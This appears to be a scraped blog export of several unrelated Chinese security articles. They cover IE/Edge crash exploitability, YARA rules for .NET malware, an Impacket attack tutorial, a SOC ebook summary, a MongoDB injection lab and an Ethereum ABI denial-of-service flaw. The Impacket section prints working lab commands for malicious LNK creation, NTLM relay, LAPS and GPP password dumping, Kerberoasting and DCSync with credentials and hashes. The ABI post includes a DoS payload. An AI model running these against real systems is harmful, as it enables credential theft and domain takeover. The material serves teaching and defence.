MP防护的UAF漏洞： 栈/寄存器引用类漏洞视为已缓解（除特殊情况外）； 堆引用类漏洞仍需通过安全更新修复。 崩溃分析实战\rMemory Protector示例\r启用Stress Mode：强制立即释放对象，排除延迟释放干扰。 分析崩溃现场：若悬垂指针始终存在于栈/寄存器中（如示例中从释放点到崩溃点全程存在引用），则判定为不可利用。 关键检查点：通过Windbg脚本扫描栈帧，确认引用位置是否覆盖关键代码路径。 MemGC验证步骤\r定位空指针解引用：确定对象基址并验证其是否被零写入。 追踪分配/释放调用栈：通过edgehtml!MemoryProtection::HeapAlloc和HeapFree确认对象受MemGC保护。 堆栈引用扫描：若发现受保护对象存在堆/栈引用，则判定为已缓解。 结论\rMemGC和MP技术大幅降低了UAF漏洞的可利用性。分析IE/Edge崩溃时，必须结合缓解机制的行为进行综合评估。\n致谢\r感谢Chris Betz、Matt Miller等团队成员对本文的贡献。\n——MSRC工程部漏洞与缓解团队：Stephen Fleming \u0026amp; Richard van Eeden\n","date":"2025-08-02T10:59:22+08:00","permalink":"http://localhost:1313/p/ie/edge%E5%B4%A9%E6%BA%83%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7%E5%88%86%E6%9E%90%E4%B8%8E%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"IE/Edge崩溃可利用性分析与微软安全防护技术解析"},{"content":"100天掌握YARA：编写.NET恶意软件特征规则\r当YARA规则仅依赖字符串匹配时，其对.NET程序集的检测能力非常有限。我们将探索更多检测机会，包括IL代码、方法签名定义和特定自定义属性。了解底层.NET元数据结构、令牌和流有助于构建更精确高效的特征规则，甚至在相关恶意样本不可用时也能发挥作用。\n案例1：基于截图的YARA规则\r有时恶意软件分析师需要根据文章或社交媒体帖子编写威胁狩猎规则，但手头没有样本。样本可能属于机密信息、未公开分享或无法获取哈希值。虽然这是特定场景，但本文还将教会您如何为.NET特征添加上下文，以及如何在有样本时跳过十六进制编辑器直接选择正确格式。\n若只有截图，我们能利用哪些信息？首先，dnSpy会话截图可能显示方法名、参数名、方法标识符和类名。此外还可能包含独特盐值、密码或编码载荷的整数数组。反编译代码也常出现在截图中，但通常无法还原为IL代码模式。我们将讨论如何为每种模式选择适当格式。\n不了解.NET内部机制的分析师可能会编写如下规则。为确保考虑字符串的不同编码，他们可能对所有字符串应用ascii和wide修饰符。\n⚠️ 为避免博客被检测，YARA规则以纯文本形式提供\n1 2 3 4 5 6 7 8 9 rule Buggy_Hunt_Rule { strings: $s1 = \u0026#34;AssemblyTitle\u0026#34; ascii wide $s2 = \u0026#34;Guid\u0026#34; ascii wide $s3 = \u0026#34;WindowsFormsApp54.Program.Main\u0026#34; ascii wide $timestamp = \u0026#34;E5 93 05 00\u0026#34; condition: all of them } 但该规则不会匹配样本，因为这些模式存在常见缺陷。在讨论.NET内部机制后，我们将解释这些缺陷并创建改进后的有效规则。\n.NET元数据头与流\r.NET文件是包含公共语言运行时(CLR)元数据的可移植可执行文件。CLR头的位置由PE文件头数据目录的第15项设置，在PE COFF规范中名为CLR运行时头。\nCLR头指向以存储签名\u0026rsquo;BSJB\u0026rsquo;开头的元数据头。元数据头定义流头。标准.NET可执行文件包含以下流：#GUID、#Strings、#US、#Blob以及优化的(#~)或未优化的(#-)元数据流（见图3）。\n元数据流引用#GUID、#Strings、#Blob中的数据并指向IL代码。IL代码本身可能引用#US堆上的用户定义字符串。\n元数据头中出现首个检测机会，因为混淆器可能添加无效流（如两个同名流或规范未定义的流名）。仅此异常通常不足以检测恶意软件，但可用于构建强大的混淆器检测规则，为逆向工程师和恶意软件分析师提供重要信息。\n下表描述各流的用途和高级格式说明。在决定YARA规则中使用哪些修饰符和模式时，请以此为参考。\n流名 格式 内容 #Blob 任意大小二进制对象的堆，4字节对齐，每个对象前有压缩长度，字符串通常为UTF-8 默认名称、方法和属性签名、自定义属性（如程序集信息、类型库GUID） #GUID 16字节二进制对象数组 全局唯一标识符如MVID #Strings UTF-8字符串，始终以零字节包围 方法名、类名、字段名、参数名 #US UTF-16字符串堆，前有压缩长度，尾字节为0或1 用户代码中定义的字符串常量 #~或#- 元数据表 - #Blob和#US流在每个元素前添加压缩长度。压缩长度计算如下（参见[2]第68页）：\n值范围 压缩大小 压缩值 0x0-0x7F 1字节 \u0026lt;值\u0026gt; 0x80-0x3FFF 2字节 0x8000 0x4000-0x1FFFFFFF 4字节 0xC0000000 只要#US字符串和#Blob条目短于128字节，前置压缩长度与实际长度相同。大多数恶意软件分析师想要创建的模式很可能就是这种情况。\n正是由于前置长度，当长度恰好是字母数字字符时，fullword修饰符可能会阻止匹配。\nGUID\r我们示例截图中显示的GUID也称为TypeLib ID，Brian Wallace在其文章《使用.NET GUID帮助搜寻恶意软件》[1]中首次描述。\nTypelib ID由Visual Studio添加，唯一标识项目。它保存在#Blob流中，因此始终以长度0x24（即\u0026rsquo;$\u0026lsquo;字符）为前缀。这是一个强大的模式，可以独立存在，并且对重新编译具有鲁棒性。\n对于像AgentTesla这样源代码泄露的恶意软件家族，如果目标是检测该家族，则可能不应使用TypeLib ID。\nWallace提到的另一个GUID是#GUID流中的MVID。MVID随重新编译而变化，适用于识别特定样本（例如查看是否重新打包了相同载荷）。它不适用于编写抗重新编译的检测规则。\n案例1的修正规则\r现在我们可以修正基于程序集信息截图的错误YARA规则：\n1 2 3 4 5 6 7 8 9 10 rule Fixed_AssemblyInfo_Rule { strings: $guid = \u0026#34;$\\x24\\x00\\x00\\x00\\x91\\xA2\\xF3\\xAE\\x31\\xA2\\x4F\\x72\\xB8\\x9A\\xEB\\x35\\xB4\\x1D\\x48\\xA6\\xBF\\xF5\\xD7\\x8D\\x39\\x91\\x18\\x64\\x94\\xBF\\x7C\\x00\\x00\u0026#34; $title = \u0026#34;a\\x34\\x00\\x00\\x00\\x4D\\x79\\x20\\x41\\x70\\x70\\x6C\\x69\\x63\\x61\\x74\\x69\\x6F\\x6E\\x20\\x44\\x65\\x73\\x63\\x72\\x69\\x70\\x74\\x69\\x6F\\x6E\\x20\\x67\\x6F\\x65\\x73\\x20\\x68\\x65\\x72\\x65\u0026#34; $url = { 80 C5 00 68 00 74 00 74 00 70 00 73 00 3A 00 2F 00 2F 00 77 00 77 00 77 00 2E 00 6D 00 79 00 63 00 32 00 73 00 65 00 72 00 76 00 65 00 72 00 2E 00 63 00 6F 00 6D 00 2F 00 70 00 61 00 79 00 6C 00 6F 00 61 00 64 00 2E 00 70 00 68 00 70 00 3F 00 69 00 64 00 3D 00 7B 00 30 00 7D 00 00 } $timestamp = \u0026#34;MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xFF\\xFF\\x00\\x00\\xB8\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xE8\\x00\\x00\\x00\\x0E\\x1F\\xBA\\x0E\\x00\\xB4\\x09\\xCD!\\xB8\\x01L\\xCD!This program cannot be run in DOS mode.\\r\\r\\n$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x93\\xE5\\x05\\x00\u0026#34; $forms = \u0026#34;\\x00WindowsFormsApp54\\x00\u0026#34; condition: $guid and $title and $url and $timestamp and $forms } 在修正的YARA规则中，我们移除了\u0026quot;AssemblyTitle\u0026quot;和\u0026quot;Guid\u0026quot;字符串，因为这些字符串编码在元数据表中，实际不出现在二进制文件中。\n此外，我们使用基于表1的格式。$guid和$title字符串来自程序集信息，因此保存在#Blob流中并带有前置压缩长度。这意味着不需要wide修饰符。\n常见缺陷是在#Blob（或#US）字符串中使用YARA的fullword修饰符。前置长度可能在字母数字范围内，如我们示例中的$title。其长度为0x34，恰好也是字符\u0026rsquo;a\u0026rsquo;。因此，fullword修饰符会阻止此类字符串的匹配，这不是我们想要的。\n通过检查前置长度，我们有一个极好的替代方案来实现fullword修饰符的意图。检查长度有三种不同方式：\n可直接嵌入字符串模式（见$guid和$title） 可使用十六进制模式（此处未显示），但由于可读性较差，建议用解码字符串的注释补充 可在条件中检查长度，这对保持可读的宽字符串很有用（见$url的条件） 除了能像fullword修饰符一样工作外，包含前置长度还为特征模式添加了结构上下文。意外作为方法名（#Strings流）出现的程序集信息文本可能不是我们要找的模式。\n为了展示#US字符串和2字节压缩长度的另一个示例，我还添加了$url。这样的下载URL可能在分析报告中提到，这里我们假设它可能被IL代码引用，因此是#US流的一部分。该URL的长度为98字符，即98*2=96字节（0xC4），因为#US以UTF-16保存它们。此外，#US流条目有一个附加的0x0或0x1，这意味着我们必须将长度加1字节，现在是0xC5。值0xC5在0x80–0x3FFF范围内，因此使用2字节编码该长度。应用公式得到：(0x8000 | 0xC5) = 0x80C5。\n错误的$timestamp没有考虑时间戳以小端格式保存。知道此时间戳是PE头的一部分，我们通过将其放置在PE签名固定偏移处来为模式添加上下文。或者，YARA的\u0026quot;pe\u0026quot;模块解析时间戳——然而解析的缺点是性能可能更差，且只能在足够有效的PE映像上运行，但可能无法检测嵌入文件、内存转储或损坏文件中的恶意软件。因此，更通用的选择是基于模式的解决方案。\n最后，我们更改$forms字符串，因为\u0026quot;WindowsFormsApp54\u0026quot;、\u0026ldquo;Program\u0026quot;和\u0026quot;Main\u0026quot;是命名空间、类和方法，作为单独条目放在#Strings堆中。它们的连接编码在元数据表中，无法用单个模式覆盖。我们从YARA规则中完全移除\u0026quot;Program\u0026quot;和\u0026quot;Main\u0026rdquo;，因为它们是相对常见的字符串。\u0026ldquo;WindowsFormsApp54\u0026quot;是Visual Studio使用的默认名称。除了编程练习外，它在干净文件中应该不常见，加上时间戳我们可能会找到用于截图的样本。由于\u0026quot;WindowsFormsApp54\u0026quot;保存在#Strings中，它被零字节包围。\n一个警告：特别是对于威胁狩猎规则，通常必须在没有样本的情况下编写，手动计算压缩长度等细节可能容易出错。但了解.NET流中使用的底层结构和编码有助于避免我们在错误狩猎规则中看到的典型错误。当您为生产环境制作实际检测规则时，这些结构细节很容易提取，并且能很好地避免误报。\n案例2：检测方法和IL代码\r对于简单情况，恶意.NET样本的字符串列表提供足够信息来编写YARA规则。然而，混淆使这种方法无法使用，如果它对用户定义字符串进行编码并替换方法、字段和类名。要成功为此类文件创建规则，多才多艺的分析师可能需要查看实际IL代码和方法签名。\n我们将为案例2查看的方法如下：\n1 2 3 4 5 6 7 8 9 10 11 public byte[] Buffer(string input) { string[] array = new string[256]; Dictionary\u0026lt;string, byte\u0026gt; dictionary = new Dictionary\u0026lt;string, byte\u0026gt;(); foreach (int num in Enumerable.Range(0, 256)) { array[num] = num.ToString(\u0026#34;X2\u0026#34;); dictionary.Add(array[num], (byte)num); } // ... 其余代码 ... } 令牌\r任何为x86代码编写规则的人都知道，函数或数据位置的地址通常应该被通配以创建鲁棒的特征模式。这是因为对代码的小改动（如额外变量、函数和指令）也会在重新编译后影响这些地址。\n.NET令牌在这方面类似于x86中的地址。就像地址一样，它们的值可能随重新编译而改变。然而，它们并不完全相同，通配整个令牌不建议。\n.NET程序集中有两种令牌：编码令牌和非编码令牌。非编码令牌是IL代码的一部分。\n.NET元数据由许多表组成，这些表定义类、参数、方法等。令牌引用元数据表中的一行。这意味着它们描述两个数据点：指定使用哪行的记录标识符和指示引用哪个表的表索引。\n每个令牌由4字节组成。第一个字节是表索引，也称为令牌类型。剩余的2-4字节是记录标识符(RID)。第一个字节定义元数据表，RID定义该表中的哪个条目被使用。\n为什么表索引也称为令牌类型？这是因为每个元数据表负责存储某种类型的条目。例如，方法保存在mdtMethodDef表中，这意味着指向该表的任何令牌都是方法定义引用，令牌类型为0x06。\n令牌类型本身在每个.NET程序集中具有相同的值，使其成为编写规则时的重要数据点。下表列出它们的值（参见[2]第76页）。\n令牌类型 值 (RID (Type \u0026laquo; 24)) mdtModule 0x00000000 mdtTypeRef 0x01000000 mdtTypeDef 0x02000000 mdtFieldDef 0x04000000 mdtMethodDef 0x06000000 mdtParamDef 0x08000000 mdtInterfaceDef 0x09000000 mdtMemberRef 0x0A000000 mdtCustomAttribute 0x0C000000 mdtPermission 0x0E000000 mdtSignature 0x11000000 mdtEvent 0x14000000 mdtProperty 0x17000000 mdtModuleRef 0x1A000000 mdtTypeSpec 0x1B000000 mdtAssembly 0x20000000 mdtAssemblyRef 0x23000000 mdtFile 0x26000000 mdtExportedType 0x27000000 mdtManifestResource 0x28000000 mdtGenericParam 0x2A000000 mdtMethodSpec 0x2B000000 mdtGenericParamConstraint 0x2C000000 另一方面，RID更应该被通配，因为与x86中的地址类似，当添加或删除表条目并重新编译样本时，它们的值可能会改变。\nIL代码模式与通配符\r让我们利用关于令牌的知识创建IL代码规则。要查看操作码，请在dnSpy中打开样本并选择\u0026quot;IL代码\u0026quot;作为语言。然后复制并粘贴要添加到规则中的代码序列。\n我们Buffer方法的部分输出如下。此代码初始化大小为256的数组和字典，然后使用Enumerable.Range(0, 256)迭代数组。\n1 2 3 4 5 6 7 8 /* 0x00000378 2000010000 */ IL_0000: ldc.i4 256 /* 0x0000037D 8D19000001 */ IL_0005: newarr [mscorlib]System.String /* 0x00000382 0A */ IL_000A: stloc.0 /* 0x00000383 731F00000A */ IL_000B: newobj instance void class [mscorlib]System.Collections.Generic.Dictionary`2\u0026lt;string, uint8\u0026gt;::.ctor() /* 0x00000388 0B */ IL_0010: stloc.1 /* 0x00000389 16 */ IL_0011: ldc.i4.0 /* 0x0000038A 2000010000 */ IL_0012: ldc.i4 256 /* 0x0000038F 282000000A */ IL_0017: call class [mscorlib] System.Collections.Generic.IEnumerable`1\u0026lt;int32\u0026gt; [System.Core]System.Linq.Enumerable::Range(int32, int32) 操作码部分是此列表中的第二列。例如，最后一个调用Range(0,256)的指令有以下十六进制字节序列：\n1 28 20 00 00 0A 第一个字节0x28是call指令的操作码。接下来的三个字节0x20 0x00 0x00是RID，因为令牌以小端格式保存。最后一个字节0x0A是令牌类型mdtMemberRef。\n这意味着对于此call指令，我们通配2-4字节，因为我们想保留调用成员引用的信息。生成的子模式如下：\n1 28 ?? ?? ?? 0A IL代码的完整YARA规则可能如下：\n1 2 3 4 5 6 7 8 rule IL_Code_Signature { strings: $op1 = { 20 00 01 00 00 } // ldc.i4 256 $op2 = { 8D 19 00 00 01 } // newarr [mscorlib]System.String $op3 = { 28 ?? ?? ?? 0A } // call System.Linq.Enumerable::Range(int32, int32) condition: all of them } 注意我们保留了数组大小和Range(0,256)调用的整数值。根据上下文和这些值变化的概率，可能需要通配这些值。表示加密密钥、活动ID或版本号的值经常变化。\n一些文章建议通配包括令牌类型在内的完整令牌，然而这样做通常没有优势。相反，除了丢失类型信息外，如果剩余的字节序列长度不足，这可能导致性能不佳。对于YARA模式，建议至少4个连续字节没有通配符，因为YARA的搜索算法首先用4字节子字符串（称为原子）进行扫描（见[4]）。\n检测方法的每个部分\r方法由主体、方法名、参数名和签名组成。在.NET程序集中，这些保存在不同的流中，因此位于程序集的不同位置。\n假设我们想为YARA规则使用所有这些信息。\n首先，方法名和参数名保存在#Strings流中。因此我们知道方法名和参数名将被零字节包围并以UTF-8格式保存。这不仅在我们需要仅基于截图编写规则时有用，而且在有样本时也能节省时间，因为我们不需要在十六进制编辑器中查找这些名称的表示形式。\n其次，IL代码引用的任何字符串都以UTF-16编码存储在#US堆中。我们已经在案例1中讨论了#String和#US字符串。\n第三，方法主体是实际的IL代码。我们在上一节讨论了这部分。\n最后，方法签名保存在#Blob流中。上下文中的方法签名指方法期望的调用约定、参数类型和返回类型，不应与检测规则混淆。此类方法签名的构建如下：\n1 method_sig ::= \u0026lt;callconven_method\u0026gt; \u0026lt;num_of_args\u0026gt; \u0026lt;return_type\u0026gt; [\u0026lt;arg_type\u0026gt;[,\u0026lt;arg_type\u0026gt;]*] Ildasm.exe显示方法签名的字节序列。使用方法完全限定名，显示字节序列的合适命令是：\n1 ILDasm.exe /text /bytes /nobar /item=\u0026#34;ns11.Class9::method_22\u0026#34; sample 以下示例输出显示最后一行中的方法签名字节序列：\n1 2 3 4 .method public hidebysig instance void method_22(class [System.Drawing]System.Drawing.Imaging.BitmapData Param_55, class [mscorlib]System.IO.MemoryStream Param_56) cil managed SIG: 20 02 01 12 29 12 2D 方法签名含义如下：\n0x20是调用约定IMAGE_CEE_CS_CALLCONV_HASTHIS，表示这是一个实例方法 0x02是参数数量，即2 0x01是返回类型VOID 0x12 0x29是第一个参数，0x12引用CLASS类型，0x29是类引用的编码令牌 0x12 0x2D是第二个参数，0x12引用CLASS类型，0x2D是类引用的编码令牌 正如我们在IL代码模式中通配RID一样，我们也应该通配方法签名中的编码令牌。编码令牌是令牌的压缩形式，允许比4字节更小的尺寸。它们不用于IL代码，但用于内部结构如方法签名。\n此外，我们在模式前添加长度0x07，因为每个#Blob条目都需要它。\n此方法签名的最终十六进制模式是：\n1 07 20 02 01 12 ?? 12 ?? 方法签名模式本身是一个弱数据点。此外，除非扫描引擎解析.NET元数据，否则方法签名不能与方法主体和名称关联。因此，对于纯模式搜索，任何具有相同方法签名的方法都会匹配。因此，它对为YARA规则添加上下文很有用，但肯定不足以独立使用。\n案例2的最终规则\r基于上一节的知识，我们为Buffer方法的YARA规则添加更多字符串：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 rule Buffer_Method_Signature { strings: $method_name = \u0026#34;\\x00Buffer\\x00\u0026#34; $param_name = \u0026#34;\\x00input\\x00\u0026#34; $us_string = { C5 80 00 58 00 32 00 00 } // \u0026#34;X2\u0026#34; with length and trailing byte $class_name = \u0026#34;\\x00Small\\x00\u0026#34; $namespace = \u0026#34;\\x00WindowsFormsApp54\\x00\u0026#34; $il_code1 = { 20 00 01 00 00 } // ldc.i4 256 $il_code2 = { 28 ?? ?? ?? 0A } // call Enumerable.Range $method_sig = { 05 00 01 1D 05 0E } // byte[] Buffer(string) condition: 3 of ($method_name, $param_name, $us_string) and all of ($il_code1, $il_code2, $method_sig) and 1 of ($class_name, $namespace) } 代码引用字符串\u0026quot;X2\u0026rdquo;。虽然它只有2个字符，但我们利用#US元素有前置长度和尾随0的知识，适当增加了$us_string模式长度。\n此外，我们为此练习包含类名和命名空间。\n我们通过以下命令提取方法签名：\n1 ildasm.exe /text /bytes /nobar /item=\u0026#34;WindowsFormsApp54.Small::Buffer\u0026#34; 方法签名的字节序列0x05 0x00 0x01 0x1D 0x05 0x0E组成如下：\n0x05是前置长度5 0x00是默认调用约定IMAGE_CEE_CS_CALLCONV_DEFAULT 0x01是参数数量 0x1D表示返回类型是SZARRAY 0x05表示数组基础类型是byte 0x0E表示第一个参数是string类型 不需要通配符，因为没有编码令牌存在。\n.NET YARA规则技巧\r了解内部结构有助于为规则添加上下文。这会产生更准确和鲁棒的检测规则，因为我们增加了模式嵌入正确结构的可能性。\n此外，它增加了我们在YARA中的表达能力，在处理缺失信息时带来更多灵活性和更少错误。它还提高了效率，因为我们不需要在十六进制编辑器中查找正确格式。\n这不仅适用于.NET。其他类型的规则，如CPython字节码的规则，也能从考虑其文件和数据结构中受益。\n可读性和可维护性的价值不应低估。需要逆向工程样本代码以确定其检测内容的规则，通常需要与从头编写类似规则相同的质量检查和时间维护。IL代码的YARA字节模式应始终包含检测到的IL代码的反汇编或反编译注释。\n参考文献\r[1] Brian Wallace, 2015, \u0026ldquo;使用.NET GUID帮助搜寻恶意软件\u0026rdquo;, VirusBulletin\n[2] Serge Lidin, 2014, \u0026ldquo;.NET IL汇编器\u0026rdquo;, Apress\n[3] https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/metadata/corcallingconvention-enumeration\n样本哈希\rf9ee3eff3345ea280c01d5fce5461b24c537cf6c3dfadc626ef73eed815c2008\n","date":"2025-08-02T10:48:22+08:00","permalink":"http://localhost:1313/p/100%E5%A4%A9%E6%8E%8C%E6%8F%A1yara%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99.net%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81%E8%A7%84%E5%88%99/","title":"100天掌握YARA：如何编写.NET代码特征规则"},{"content":"Impacket攻击基础与Azure实验室搭建\r概述\r本文是对Impacket工具集作者SecureAuthCorp及开源维护者的致敬，将介绍该工具包的核心技术应用。项目地址：https://github.com/SecureAuthCorp/impacket\n实验室搭建\r使用ARM模板部署（doazlab.com或github.com/DefensiveOrigins/DO-LAB）：\n认证可创建资源的Azure订阅 部署包含域控制器、加入的工作站和Ubuntu系统的实验环境 ntlmrelayx.py攻击实战\r恶意LNK文件攻击（MITRE ATT\u0026amp;CK T1204）\r通过PowerShell创建诱导性快捷文件：\n1 2 3 4 5 6 7 8 9 10 11 cd c:\\ mkdir c:\\file6 New-SmbShare -Name \u0026#34;file6\u0026#34; -Path \u0026#34;C:\\file6\u0026#34; -ChangeAccess \u0026#34;Users\u0026#34; -FullAccess \u0026#34;Administrators\u0026#34; $objShell = New-Object -ComObject WScript.Shell $lnk = $objShell.CreateShortcut(\u0026#34;c:\\file6\\malicious.lnk\u0026#34;) $lnk.TargetPath = \u0026#34;\\\\10.0.0.8\\@threat.png\u0026#34; $lnk.WindowStyle = 1 $lnk.IconLocation = \u0026#34;%windir%\\system32\\shell32.dll, 3\u0026#34; $lnk.Description = \u0026#34;用户浏览含此LNK文件的共享时将触发SMB认证\u0026#34; $lnk.HotKey = \u0026#34;Ctrl+Alt+O\u0026#34; $lnk.Save() 中间人攻击（MITRE ATT\u0026amp;CK T1557）\r启动ntlmrelayx监听器：\n1 2 3 4 5 sudo -s cd /opt/impacket source imp-env/bin/activate cd examples ntlmrelayx.py -t 192.168.2.5 -smb2support | tee –a /opt/impacket/relay1.log 当受害者访问含恶意LNK的共享时，凭证将被中继到目标系统。\nLDAP服务攻击\r针对域控制器的安全LDAP服务（TCP/636）：\n1 ntlmrelayx.py -t ldaps://dc01.doazlab.com -ts -l /opt/impacket/loot --add-computer BHISBlog47 --dump-laps --no-dump --no-da 参数说明：\n-t: 指定目标LDAP服务 -ts: 控制台输出添加时间戳 -l: 定义战利品目录 --add-computer: 添加域计算机 --dump-laps: 提取LAPS密码 --no-dump: 不转储AD数据 --no-da: 不创建域管理员 其他Impacket工具\rGetADUsers.py（MITRE ATT\u0026amp;CK T1087）\r枚举域用户：\n1 python3.9 GetADUsers.py -all -ts doazlab.com/doadmin:\u0026#39;DOLabAdmin1!\u0026#39; -dc-ip 192.168.2.4 |tee -a /opt/adusers.txt Get-GPPPassword.py（MITRE ATT\u0026amp;CK T1552.006）\r提取组策略首选项密码：\n1 python3.9 Get-GPPPassword.py \u0026#39;doazlab.com\u0026#39;/\u0026#39;doadmin\u0026#39;:\u0026#39;DOLabAdmin1!\u0026#39;@\u0026#39;192.168.2.4\u0026#39; GetUserSPNs.py（MITRE ATT\u0026amp;CK T1558.003）\r收集Kerberos票据哈希：\n1 python3.9 GetUserSPNs.py \u0026#39;doazlab.com\u0026#39;/\u0026#39;doadmin\u0026#39;:\u0026#39;DOLabAdmin1!\u0026#39; -dc-ip 192.168.2.4 -outputfile /opt/hashes/kerbs.txt Secretsdump.py\r远程凭证转储（MITRE ATT\u0026amp;CK T1003.003）：\r1 python3.9 secretsdump.py doazlab/doadmin:\u0026#39;DOLabAdmin1!\u0026#39;@192.168.2.5 |tee -a /opt/hashes/secrets-output.txt DCSync攻击（MITRE ATT\u0026amp;CK T1003.006）：\r1 python3.9 secretsdump.py -outputfile \u0026#39;doazlab.dit\u0026#39; \u0026#39;doazlab.com\u0026#39;/doadmin@\u0026#39;192.168.2.4\u0026#39; -hashes aad3c435b514a4eeaad3b935b51304fe:3606a042149187931ced1f8cedafe26c ","date":"2025-08-02T10:34:24+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8azure%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%BF%9B%E8%A1%8Cimpacket%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/","title":"使用Azure实验室进行Impacket攻击基础教程"},{"content":"构建AI驱动的统一SOC：微软新电子书指南\r面对全球每天超过6亿次的网络攻击，微软推出《协调防御：构建AI驱动的统一SOC》电子书，指导企业从传统安全模式转向深度防御策略。该指南基于微软实战经验，提出三大核心改进方向：\n统一安全运营架构\r预防阶段：通过风险优先级排序、攻击面缩减和主动漏洞识别增强韧性 检测阶段：实现实时威胁隔离、勒索软件快速响应和预测性威胁情报 响应阶段：提供统一事件队列、自动关联警报和基于严重性的威胁分级 关键技术领域防护\r端点保护：反勒索软件策略和恶意软件防御 身份安全：防范账户接管的新型身份威胁 云原生应用：针对云漏洞的最佳实践 SIEM/XDR整合：降低误报率并应对高级持续性威胁 数据保护：敏感数据保护和内部风险缓解 AI驱动转型路径\r电子书详细介绍了如何通过Microsoft Security Copilot等AI助手实现：\n自动化常规任务 关联警报生成完整事件 增强现有安全专家能力 该架构通过集中化数据管理和AI增强分析，将平均解决时间（MTTR）降低40%。企业可访问微软安全博客获取完整电子书及集成网络威胁防护资源。\n数据来源：2024微软数字防御报告\n","date":"2025-08-02T10:23:13+08:00","permalink":"http://localhost:1313/p/%E6%9E%84%E5%BB%BAai%E9%A9%B1%E5%8A%A8%E7%9A%84%E7%BB%9F%E4%B8%80soc%E5%BE%AE%E8%BD%AF%E6%96%B0%E7%94%B5%E5%AD%90%E4%B9%A6%E6%8C%87%E5%8D%97/","title":"构建AI驱动的统一SOC：微软新电子书指南"},{"content":"NoSQLi Lab\r随着NoSQL的流行，我决定建立一个实验室来研究针对NoSQL数据库的各种攻击技术。这就是最终的成果\u0026hellip;\n由于之前已使用Redis进行过开发工作，本次实验我选择MongoDB作为研究对象。实验室构建了两种漏洞场景：一种是类似SQL注入中\u0026quot;or 1=1\u0026quot;的经典漏洞，另一种是NoSQL特有的脚本注入攻击。未来可能会添加更多场景，但当前这两个已足够开展基础研究。\n环境搭建\r安装过程非常简单，关键是要确保Linux发行版包含PHP的最新MongoDB驱动。正确的驱动是：\n1 php-mongodb - MongoDB driver for PHP 而错误的旧版驱动是：\n1 php5-mongo - MongoDB database driver 实验代码托管在Github：https://github.com/digininja/nosqlilab。以下是在Debian Stretch系统上的部署步骤（注意Jessie系统使用旧版驱动无法运行）：\n1 2 3 4 5 6 apt-get update \u0026amp;\u0026amp; apt-get dist-upgrade apt-get install php-mongodb apache2 vim mongodb git php cd /var/www/html/ rm index.html git clone https://github.com/digininja/nosqlilab 访问服务器IP后应看到实验室首页：\n数据库初始化\r首先需要通过\u0026quot;Reset Database\u0026quot;链接初始化测试数据。成功时会显示\u0026quot;Database Reset Successfully\u0026quot;消息：\n若出现PHP代码说明PHP未正确安装或启用；若页面渲染不完整则可能是MongoDB库缺失，可检查Apache错误日志或通过phpinfo()页面验证驱动是否加载正确。\n漏洞场景\r实验包含两个存在漏洞的页面：\n\u0026ldquo;Guess The Key\u0026rdquo; - 经典注入漏洞 \u0026ldquo;User Lookup\u0026rdquo; - NoSQL特有攻击场景 具体攻击方法可参考OWASP的《NoSQL注入测试指南》，实验代码中也提供了隐藏的解决方案示例。\n问题反馈\r提示：所有实验内容由Robin Wood创建，除非另有说明。项目采用非商业性质，可通过affiliate链接支持作者。\n","date":"2025-08-02T10:07:12+08:00","permalink":"http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/","title":"NoSQL注入实验室 - 探索MongoDB安全漏洞实战"},{"content":"亿次空耗 - The Trail of Bits博客\r在以太坊强大的区块链技术背后，隐藏着一个开发者们较少提及的挑战：编写健壮的以太坊ABI（应用二进制接口）解析器的复杂性。以太坊ABI对区块链基础设施至关重要，它实现了智能合约与外部应用间的无缝交互。数据类型的复杂性和编解码的精确需求使得ABI解析充满挑战。规范或实现中的模糊性可能导致危及用户的漏洞。\n本文将深入剖析一个新型漏洞，该漏洞针对这些解析器，令人联想到曾肆虐XML领域的\u0026quot;十亿大笑\u0026quot;攻击。我们发现以太坊ABI规范部分条款表述松散，导致多个实现存在可利用漏洞，包括eth_abi(Python)、ethabi(Rust)、alloy-rs和ethereumjs-abi等库，可能引发拒绝服务(DoS)攻击。截至发文时，仅Python库已完成修复。\n什么是以太坊ABI？\r当链上合约交互或链下组件与合约通信时，以太坊使用ABI编码来处理请求和响应。这种编码方式不自我描述，编解码器需要提供定义数据类型的模式。与C语言中平台相关的ABI不同，以太坊规范了应用间二进制数据的传递方式。虽然规范尚未正式化，但清晰展现了数据交换机制。\n当前规范存在于Solidity文档中，其类型定义影响了Solidity和Vyper等智能合约语言。\n漏洞原理\r零大小类型(ZST)指在磁盘存储中占零（或极小）字节，但加载到内存后需要显著更多空间的数据类型。以太坊ABI允许ZST存在，攻击者可利用其特性，通过极小量的磁盘或网络数据诱发巨大的内存分配。\n考虑以下场景：当解析器遇到ZST数组时会发生什么？它会尝试解析数组声明包含的所有ZST元素。由于每个元素占零字节，定义超大型ZST数组轻而易举。\n示例显示：20字节的磁盘数据可反序列化为包含数字2、1、3的数组；而仅8字节的数据却能反序列化为2³²个ZST元素（如空元组或空数组）。如果每个ZST在解析后仍占零字节内存，这不成问题。但实践中，每个元素通常需要少量非零内存，导致整体数组需要巨大内存分配，形成DoS攻击。\n概念验证\r我们通过以下十六进制数据载荷演示多个库中的漏洞：\n1 2 0000000000000000000000000000000000000000000000000000000000000020 00000000000000000000000000000000000000000000000000000000FFFFFFFF 